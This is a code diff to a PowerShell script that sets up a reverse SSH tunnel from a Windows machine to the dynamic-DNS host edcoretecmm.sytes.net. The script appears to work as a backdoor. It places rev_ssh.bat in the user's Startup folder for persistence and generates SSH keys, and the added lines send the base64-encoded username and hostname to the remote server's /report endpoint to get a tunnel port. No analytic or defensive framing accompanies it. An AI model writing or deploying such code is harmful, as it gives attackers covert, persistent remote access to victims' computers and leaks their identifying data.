@@ -30,18 +30,31 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP-All" -ErrorAction Silentl
 # Get actual logged-in username and profile path (works even if running as SYSTEM)
 $username = (Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty UserName)
 $username = $username.Split('\')[-1]
+$hostname = $env:COMPUTERNAME
 $userProfile = "C:\Users\$username"
 $sshDir = "$userProfile\.ssh"
 $keyFile = "$sshDir\${username}_ed25519"
 $pubKeyFile = "$keyFile.pub"
-$user = "nobody1"
+$user = "suser"
 $remote_host = "edcoretecmm.sytes.net"
-$receivedPort = 2004
+$receivedPort = 2023
 $neutralPath = "C:\ProgramData\revssh"
 #$logFile = "$neutralPath\rev_ssh.log"
 $logFile = "$userProfile\rev_ssh.log"
 #$batFilePath = "$neutralPath\rev_ssh.bat"
 $batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
+
+
+# Encode the data as base64 without newline
+$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$username`:$hostname"))
+
+# Request port to backend
+$domain_name = "edcoretecmm.sytes.net:8080"
+$response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -UseBasicParsing
+
+# Clean response (remove any percent signs)
+$received_port = $response -replace '%', ''
+$received_port
 
 # Create C:\ProgramData\revssh if it doesn't exist
 if (-not (Test-Path $neutralPath)) {
